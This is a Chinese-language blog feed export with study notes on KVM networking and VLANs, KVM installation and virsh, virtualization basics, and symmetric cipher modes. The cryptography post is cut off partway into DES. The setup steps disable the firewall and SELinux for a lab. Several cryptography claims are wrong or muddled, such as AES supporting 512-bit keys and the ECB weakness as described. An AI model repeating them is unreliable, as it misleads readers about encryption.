alt="image-20200705104341912"></p><p>注：使用NAT的虚拟机可以访问外网，但外网无法直接访问VM1，因为VM1发出的网络包源地址并不是192.168.122.53，而是被NAT替换为主机的IP了。</p><p>与br0不同的是：在br0情况下，VM1通过自己的IP直接与外网通信，而不需经过NAT地址转换。</p><h3 id="VLAN"><a href="#VLAN" class="headerlink" title="VLAN"></a>VLAN</h3><p>LAN（Local Area Network）本地局域网，通常使用Hub和Switch来连接LAN中的计算机。</p><p>一个LAN代表一个广播域。LAN中的所有成员都会收到任意一个成员发出的广播包。</p><p>VLAN（Virtual LAN）。VLAN将一个交换机分成了多个交换机，限制了广播的范围，在二层将计算机隔离到不同的VLAN中。</p><p>交换机的端口有两种配置模式：<strong>Access</strong>和<strong>Trunk</strong>。</p><p><strong>Access口</strong>：端口打上VLAN标签，表明该端口属于哪个VLAN。利用VLAN ID来区分。Access口都是直接与计算机网卡相连，这样从该网卡出来的数据包流入Access口就被打上VLAN标签。</p><p><strong>Trunk口</strong>：交换机A、B中都有不同标签的VLAN，利用trunk口将其相连。</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggfwr3hcivj30g509s0w0.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1ggfwr3hcivj30g509s0w0.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200705105437408"></p><h3 id="KVM环境下实现VLAN（未成功）"><a href="#KVM环境下实现VLAN（未成功）" class="headerlink" title="KVM环境下实现VLAN（未成功）"></a>KVM环境下实现VLAN（未成功）</h3><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggfx187uzbj30cs0dstai.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1ggfx187uzbj30cs0dstai.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200705110421224"></p><p>Brvlan10：Bridge上的其他网络设备自动加入到VLAN10中。</p><p>配置解释：主机用软件实现了一个（虚拟）交换机，上面定义了一个VLAN10。eth0.10、brvlan10和vnet0都分别接到VLAN10的Access口。eth0是一个Trunk口。VM1通过vnet0发出来的数据包都会被打上VLAN10的标签。</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggfx6hf4qvj30dw0e10vm.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1ggfx6hf4qvj30dw0e10vm.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200705110924214"></p><h3 id="虚拟交换机（Linux-Bridge-VLAN）"><a href="#虚拟交换机（Linux-Bridge-VLAN）" class="headerlink" title="虚拟交换机（Linux Bridge + VLAN）"></a>虚拟交换机（Linux Bridge + VLAN）</h3><p>KVM网络虚拟化总结：</p><ol><li>VLAN两层功能：交换与隔离。物理交换机存在多个VLAN，每个VLAN拥有多个端口，同一VLAN端口之间可以交换转发，不同VLAN端口之间隔离。</li><li>VLAN实现隔离功能。一个VLAN母设备（eth0）不能拥有两个相同的VLAN ID子设备，也就不能出现数据交换情况。</li><li>Linux Bridge实现交换功能。将同一VLAN的子设备都挂载到一个Bridge上，设备之间就可以交换数据了。</li></ol><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ol><li><p><a href="https://blog.csdn.net/mdykj33/article/details/102638382">Centos8如何配置网桥</a></p></li><li><p><a href="https://blog.csdn.net/u010599211/article/details/86672940">nmcli命令详解</a></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> OpenStack </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>[OpenStack]3.安装&amp;管理KVM实验环境</title>
      <link href="2020/06/18/OpenStack-3-%E5%AE%89%E8%A3%85&amp;%E7%AE%A1%E7%90%86KVM%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83/"/>
      <url>2020/06/18/OpenStack-3-%E5%AE%89%E8%A3%85&amp;%E7%AE%A1%E7%90%86KVM%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83/</url>
      
        <content type="html"><![CDATA[<p>安装Ubuntu虚拟机和KVM实验环境。</p><a id="more"></a><h3 id="安装KVM"><a href="#安装KVM" class="headerlink" title="安装KVM"></a>安装KVM</h3><h4 id="步骤一：关闭防火墙和系统增强功能"><a href="#步骤一：关闭防火墙和系统增强功能" class="headerlink" title="步骤一：关闭防火墙和系统增强功能"></a>步骤一：关闭防火墙和系统增强功能</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost &#x2F;]# systemctl stop firewalld</span><br><span class="line">[root@localhost &#x2F;]# systemctl disable firewalld</span><br><span class="line">[root@localhost &#x2F;]# vi &#x2F;etc&#x2F;selinux&#x2F;config</span><br><span class="line">将SELINUX&#x3D;enforcing改为SELINUX&#x3D;disabled，重启计算机生效。</span><br></pre></td></tr></table></figure><h4 id="步骤二：安装KVM及其必要组件"><a href="#步骤二：安装KVM及其必要组件" class="headerlink" title="步骤二：安装KVM及其必要组件"></a>步骤二：安装KVM及其必要组件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost &#x2F;]# yum -y install qemu-kvm  libvirt libvirt-daemon  libvirt-client  libvirt-daemon-driver-qemu  virt-manager virt-install  virt-viewer virt-v2v</span><br></pre></td></tr></table></figure><p>软件包介绍：</p><ul><li>qemu-kvm: 为kvm提供底层仿真支持；</li><li>libvirt-daemon: libvirtd守护进程，管理虚拟机；</li><li>libvirt-client: 用户端软件，提供客户端管理命令；</li><li>libvirt-daemon-driver-qemu: libvirtd连接qemu的驱动</li><li>libvirt: 虚拟管理模块；</li><li>virt-manager: 图形界面管理工具；</li><li>virt-install: 虚拟机命令行安装工具；</li><li>virt-v2v: 虚拟机迁移工具；</li></ul><h3 id="启动KVM虚拟机"><a href="#启动KVM虚拟机" class="headerlink" title="启动KVM虚拟机"></a>启动KVM虚拟机</h3><p><code>virt-manager</code>打开图形化界面</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggdiogtuaqj30u00w4myc.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1ggdiogtuaqj30u00w4myc.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200703091632046"></p><h4 id="步骤一：新建虚拟机（选择现有镜像）"><a href="#步骤一：新建虚拟机（选择现有镜像）" class="headerlink" title="步骤一：新建虚拟机（选择现有镜像）"></a>步骤一：新建虚拟机（选择现有镜像）</h4><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggdipidicaj30p00p2dh6.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1ggdipidicaj30p00p2dh6.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200703091735288"></p><h4 id="步骤二：选择镜像"><a href="#步骤二：选择镜像" class="headerlink" title="步骤二：选择镜像"></a>步骤二：选择镜像</h4><p>默认位置在/var/lib/libvirt/images</p><p>cirros 是一个很小的 linux 镜像，非常适合测试用.</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggdq75vj6nj30us0u0diw.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1ggdq75vj6nj30us0u0diw.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200703133641908"></p><h4 id="步骤三：分配CPU和内存"><a href="#步骤三：分配CPU和内存" class="headerlink" title="步骤三：分配CPU和内存"></a>步骤三：分配CPU和内存</h4><p>默认即可</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggdq8n6aorj30ou0p4my5.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1ggdq8n6aorj30ou0p4my5.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200703133809974"></p><h4 id="步骤四：新建名字即配置完成"><a href="#步骤四：新建名字即配置完成" class="headerlink" title="步骤四：新建名字即配置完成"></a>步骤四：新建名字即配置完成</h4><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggdq9kth0nj30oq0p0myg.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1ggdq9kth0nj30oq0p0myg.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200703133903607"></p><h3 id="利用virsh管理虚拟机"><a href="#利用virsh管理虚拟机" class="headerlink" title="利用virsh管理虚拟机"></a>利用virsh管理虚拟机</h3><p><code>$ virsh list</code></p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggdqay4p23j314k0ryt9w.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1ggdqay4p23j314k0ryt9w.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200703134023051"></p><h3 id="远程管理虚拟机"><a href="#远程管理虚拟机" class="headerlink" title="远程管理虚拟机"></a>远程管理虚拟机</h3><p>virt-manager也可以远程管理其他宿主机上虚拟机。同SSH连接方式，此处不在赘述。</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggdqcp7jsuj30u00w10un.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1ggdqcp7jsuj30u00w10un.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200703134203816"></p>]]></content>
      
      
      <categories>
          
          <category> OpenStack </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>[OpenStack]1.绪论</title>
      <link href="2020/06/18/OpenStack-1-%E7%BB%AA%E8%AE%BA/"/>
      <url>2020/06/18/OpenStack-1-%E7%BB%AA%E8%AE%BA/</url>
      
        <content type="html"><![CDATA[<p>打算入门OpenStack以及一些简单地说明。</p><a id="more"></a><h3 id="学习目标"><a href="#学习目标" class="headerlink" title="学习目标"></a>学习目标</h3><ol><li>系统学习OpenStack：从架构到各个组件，从整体到细节逐一讨论。</li><li>重实践并兼顾理论：从实际操作角度来学习OpenStack并理解。</li></ol><h3 id="学习难点"><a href="#学习难点" class="headerlink" title="学习难点"></a>学习难点</h3><ol><li>OpenStack涉及的知识领域广：涵盖了IT基础设施的所有范围（计算、存储、网络、虚拟化、高可用、安全、灾备）。</li><li>OpenStack是一个平台，不是一个具体的实施方案：采用Driver架构，支持各种具体的实现技术。</li><li>OpenStack是一个分布式系统。</li></ol><h3 id="学习内容"><a href="#学习内容" class="headerlink" title="学习内容"></a>学习内容</h3><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gfwunig04mj30zk0k4dsc.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlgy1gfwunig04mj30zk0k4dsc.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200618231607029"></p><ol><li>预备知识：虚拟化和云计算的基础知识（KVM、laaS）</li><li>OpenStack核心：OpenStack的架构和各个核心组件。</li></ol>]]></content>
      
      
      <categories>
          
          <category> OpenStack </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>[OpenStack]2.虚拟化</title>
      <link href="2020/06/18/OpenStack-2-%E8%99%9A%E6%8B%9F%E5%8C%96/"/>
      <url>2020/06/18/OpenStack-2-%E8%99%9A%E6%8B%9F%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<p>学习虚拟化及其技术KVM。</p><a id="more"></a><h3 id="虚拟化"><a href="#虚拟化" class="headerlink" title="虚拟化"></a>虚拟化</h3><p>虚拟化是云计算的基础。</p><p>虚拟化让一台物理机可以运行多个虚拟机，共享物理机的CPU、内存、IO，但是在逻辑上虚拟机之间是相互隔离的。</p><p>注：宿主机Host，虚拟机（客户机）Guest。</p><p>通过Hypervisor程序来实现虚拟化。目前有两种虚拟化（1型虚拟化、2型虚拟化）</p><h4 id="1型虚拟化"><a href="#1型虚拟化" class="headerlink" title="1型虚拟化"></a>1型虚拟化</h4><p>Hypervisor直接安装在物理机。多个虚拟机在Hypervisor上运行。（采用此模式有Xen和VMWare的ESXi）</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gfwuy9bn01j30tc0j4wks.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlgy1gfwuy9bn01j30tc0j4wks.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200618232629233"></p><h4 id="2型虚拟化"><a href="#2型虚拟化" class="headerlink" title="2型虚拟化"></a>2型虚拟化</h4><p>物理机上安装常规操作系统（Linux、MacOS、WIndows）。Hypervisor作为OS的一个程序运行，并对虚拟机进行管理。（采用此模式有KVM、VirtualBox和VMWare Workstation）</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gfwv28pmdij30tg0jcag7.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlgy1gfwv28pmdij30tg0jcag7.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200618233021103"></p><h4 id="1型与2型虚拟化比较"><a href="#1型与2型虚拟化比较" class="headerlink" title="1型与2型虚拟化比较"></a>1型与2型虚拟化比较</h4><p>1型虚拟化对硬件虚拟化功能进行了优化，性能比2型好。</p><p>2型基于普通操作系统，比较灵活，比如支持虚拟机嵌套。</p><h3 id="KVM"><a href="#KVM" class="headerlink" title="KVM"></a>KVM</h3><p>KVM（Kernel-Based Virtual Machine）是基于Linux内核实现的。KVM是x86平台运行最广泛的虚拟化方案，且OpenStack对KVM支持很好。KVM有个内核模块叫<code>kvm.ko</code>，用于管理虚拟CPU和内存，Linux内核和Qemu来管理存储和网络设备。</p><h4 id="KVM管理工具Libvirt"><a href="#KVM管理工具Libvirt" class="headerlink" title="KVM管理工具Libvirt"></a>KVM管理工具Libvirt</h4><p>作为KVM的管理工具Libvirt除了可以管理Hypervisor（KVM），还能管理Xen、VirtualBox。</p><p>注：OpenStack底层也使用Libvirt。</p><p>Libvirt三模块</p><table><thead><tr><th>模块</th><th>说明</th></tr></thead><tbody><tr><td>后台daemon程序libvirtd</td><td>服务程序，接收和处理API请求</td></tr><tr><td>API库</td><td>开发基于Libvirt的高级工具（图形化KVM管理工具virt-manager）</td></tr><tr><td>命令行工具virsh</td><td>KVM命令行工具</td></tr></tbody></table><p>注：virsh和virt-manager工具在后面会学习。</p>]]></content>
      
      
      <categories>
          
          <category> OpenStack </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>【密码学】对称密码体制</title>
      <link href="2020/04/25/%E3%80%90%E5%AF%86%E7%A0%81%E5%AD%A6%E3%80%91%E5%AF%B9%E7%A7%B0%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/"/>
      <url>2020/04/25/%E3%80%90%E5%AF%86%E7%A0%81%E5%AD%A6%E3%80%91%E5%AF%B9%E7%A7%B0%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<p>本文学习对称密码学的基础概念，分组密码的四种工作方式，以及详细介绍DES、AES的加密算法过程与Python实现。</p><a id="more"></a><h2 id="概述："><a href="#概述：" class="headerlink" title="概述："></a>概述：</h2><h3 id="对称密码"><a href="#对称密码" class="headerlink" title="对称密码"></a>对称密码</h3><ol><li>要求加密与解密使用同一个共享密钥，因此要求通信双方必须在通信前商定密钥并妥善保存。</li><li>对称密码体制从工作方式上可以分为分组加密和序列密码两大类。</li><li>优点：算法公开、计算量小、加密速度快、加密效率高</li><li>缺点：交易双方都使用同样钥匙，安全性得不到保证</li></ol><p><strong>序列密码（流加密）</strong>：对明文的单字节进行运算，明文加密后密码保持和明文同样长度，解密是指用同样的密钥和密码算法及与加密相同的伪随机位流，用以还原明文位流。常见流密码算法有RC4、SEAL等。</p><p><strong>分组密码（块加密）</strong>：将明文信息划分成不同的块，分别对每个块进行运算。多用于网络加密。分块长度越长，密码分析越困难，越不利于操作和运算，分块长度应该权衡安全性与实用性。常见分组密码算法有DES、AES等。</p><h3 id="DES、3DES、AES"><a href="#DES、3DES、AES" class="headerlink" title="DES、3DES、AES"></a>DES、3DES、AES</h3><p>常见对称加密算法包括DES、3DES、AES。</p><p>DES(Data Encryption Standard) 数据加密标准，速度较快，适用于加密大量数据的场合。</p><p>3DES(Triple DES) 基于DES，对一块数据用三个不同的密钥进行三次加密，强度更高、</p><p>AES(Advanced Encryption Standard) 高级加密标准，下一代的加密算法，速度、安全级别更高，支持128，192，256，512位密钥的加密。</p><p>算法特征：</p><ol><li>加密方与解密方使用同一个密钥。</li><li>加密解密的速度比较快，适合数据比较大时的使用。</li><li>密钥传输的过程不安全，且容易被破解，密钥管理比较麻烦。</li></ol><h2 id="分组加密的四种工作方式"><a href="#分组加密的四种工作方式" class="headerlink" title="分组加密的四种工作方式"></a>分组加密的四种工作方式</h2><ul><li>ECB(Electronic Code Book) 电子编码本</li><li>CBC(Cipher Block Chaining) 密码分组链接</li><li>CFB(Cipher Feedback) 密码反馈</li><li>OFB(Output Feedback) 输出反馈</li></ul><h3 id="ECB"><a href="#ECB" class="headerlink" title="ECB"></a>ECB</h3><p>ECB模式是最简单的加密算法，明文消息被分成固定大小的块，并且每个块被单独加密。每个块的加密与解密都是独立的，且使用相同的方式进行加密，所以可以进行并行计算。但是这种方法存在缺点，一旦有一个块被破解，使用相同的方式可以解密其他块，导致可以解密出所有明文数据，安全性比较差。</p><p><strong>适用场景</strong>：数据较少，加密前需要把明文数据填充到块大小的整数倍。</p><p><strong>优点</strong>：简单、孤立，每个块单独运算。适合并行运算，传输错误一般只影响当前块。</p><p><strong>缺点</strong>：同明文输出同密码，可能导致明文攻击。</p><center>ECB Encryption示意图</center><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ge621zb65kj31680d6q4u.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1ge621zb65kj31680d6q4u.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200425154143112"></p><center>ECB Decryption示意图</center><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ge6258rg9cj313g0cwabx.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1ge6258rg9cj313g0cwabx.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200425154453598"></p><h3 id="CBC"><a href="#CBC" class="headerlink" title="CBC"></a>CBC</h3><p>CBC模式中每一个分组要先和前一个分组加密后的数据进行XOR异或操作，然后再进行加密。因此每个密文块依赖该块之前的所有明文块，为了保持每条消息都具有唯一性，第一个数据块进行加密之前需要用初始化向量IV进行异或操作。</p><p><strong>适用场景</strong>：最常见的加密方式，并且与ECB一样消息块必须填充到块大小的整倍数。</p><p><strong>优点</strong>：串行化运算，相同明文不同密文。</p><p><strong>缺点</strong>：需要初始向量。加密是连续的，不能并行处理。</p><center>CBC Encryption示意图</center><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ge62i3vwocj317c0dg0vi.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1ge62i3vwocj317c0dg0vi.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200425155715249"></p><center>CBC Decryption示意图</center><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ge62ini55tj318q0e8tbx.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1ge62ini55tj318q0e8tbx.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200425155746741"></p><h3 id="CFB"><a href="#CFB" class="headerlink" title="CFB"></a>CFB</h3><p>CFB模式与CBC模式比较相似，前一个分组的密文加密后和当前分组的明文XOR异或操作生成当前分组的密文。(与CBC模式仅在异或的顺序上不同)</p><p><strong>优点</strong>：同明文不同密文，分组密钥转换为流密码</p><p><strong>缺点</strong>：串行运算不利并行，传输错误可能导致后续传输块的错误</p><center>CFB Encryption示意图</center><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ge62pt3hagj31780demzx.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1ge62pt3hagj31780demzx.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200425160439178"></p><center>CFB Decryption示意图</center><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ge62wqu49uj317q0cytbd.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1ge62wqu49uj317q0cytbd.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200425161118871"></p><h3 id="OFB"><a href="#OFB" class="headerlink" title="OFB"></a>OFB</h3><p>OFB模式将分组密码转换为同步流密码（根据明文长度先独立生成相应长度的流密码），与CFB模式非常相似，CFB是前一个分组的密文加密后XOR当前分组明文。OFB是初始化向量IV不断加密后XOR前一组的明文。由于异或操作的对称性，OFB模式的解密与加密的流程一样。</p><p><strong>优点</strong>：同明文不同密文，分组密钥转换为流密码</p><p><strong>缺点</strong>：串行运算不利并行，传输错误可能导致后续传输块的错误。</p><center>OFB Encryption示意图</center><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ge6362ukurj316m0du76q.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1ge6362ukurj316m0du76q.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200425162017815"></p><center>OFB Decryption示意图</center><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ge636f4olqj317c0ekwhj.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1ge636f4olqj317c0ekwhj.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200425162037210"></p><h2 id="DES加密过程"><a href="#DES加密过程" class="headerlink" title="DES加密过程"></a>DES加密过程</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>采用56位密钥加密64位的明文数据</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ge6dno7udfj313w0daae4.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1ge6dno7udfj313w0daae4.jpg" 